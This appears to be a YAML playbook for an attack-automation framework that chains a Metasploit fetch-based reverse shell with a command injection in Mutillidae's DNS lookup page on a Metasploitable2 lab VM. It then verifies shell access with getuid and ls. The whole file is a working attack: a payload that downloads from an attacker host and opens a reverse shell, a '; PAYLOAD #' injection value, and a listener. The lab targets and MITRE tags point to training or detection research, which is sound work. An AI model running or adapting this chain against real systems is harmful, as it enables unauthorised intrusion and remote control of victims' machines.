#
# Author: Wolfgang Hotwagner
# Description:
#     This playbook perfoms the following attack-steps:
#     1. Create a staged reverse shell that uses a curl command
#     2. Store payload in a variable(RESULT_STDOUT)
#     3. Create a variable for the command injection: '; PAYLOAD #'
#     4. Start a listener(in background) for the reverse shell using metasploit
#     5. Perform the http-request that triggers the command injection
#     6. Execute commands via reverse shell
#
# Requirements:
#     1. Run this on kali-linux
#     2. Metasploit installed and msfrpd executed
#     3. Target a Metasploitable2-VM
#
vars:
  METASPLOITABLE: 192.168.0.146
  ATTACKER: 192.168.0.29
  PAYLOAD: cmd/linux/http/x86/meterpreter/reverse_tcp
  LPORT: "4401"

commands:
  - type: mktemp
    variable: RSHELL
    metadata:
      description: "Prepare directory for reverse shell"

  # generate a staged reverse shell
  # use a fetch-payload(curl) for the cmdstager
  - type: msf-payload
    cmd: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
      FETCH_WRITABLE_DIR: /tmp
      FETCH_SRVHOST: $ATTACKER
      FETCH_SRVPORT: "8080"
    format: raw
    local_path: ${RSHELL}
    metadata:
      description: "Preparing the shellcode for further attacks"

  # save payload in variable
  - type: shell
    cmd: cat $RSHELL
    metadata:
      description: "Print out payload"

  # prepare the command-injection-payload
  - type: setvar
    variable: CMDSTAGE
    cmd: "; $RESULT_STDOUT #"
    metadata:
      description: "Set variable CMDSTAGE"

  # start shell-listener in background
  - type: msf-module
    creates_session: shell
    cmd: exploit/multi/handler
    payload: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
      FETCH_WRITABLE_DIR: /tmp
      FETCH_SRVHOST: $ATTACKER
      FETCH_SRVPORT: "8080"
    background: true
      #exit_on_error: false
    kill_on_exit: true
    metadata:
      description: "Start local listener for reverse shell"

  - type: sleep
    seconds: 10

  # execute the command injection and trigger the reverse shell download
  - type: http-client
    cmd: POST
    url: http://$METASPLOITABLE/mutillidae/index.php?page=dns-lookup.php
    data:
      target_host: $CMDSTAGE
      dns-lookup-php-submit-button: "Lookup+DNS"
    background: false
    exit_on_error: false
    metadata:
      techniques: "T1190,T1059.004,T1105"
      tactics: "Initial Access,Execution,Command and Control"

  - type: sleep
    seconds: 10

  # execute a command via reverse shell
  - type: msf-session
    session: shell
    cmd: getuid
    metadata:
      description: "Verify shell access"
      techniques: "T1033"
      tactics: "Discovery"

  # execute a command via reverse shell
  - type: msf-session
    session: shell
    cmd: ls
    metadata:
      description: "List directory entries"
      techniques: "T1083"
      tactics: "Discovery"
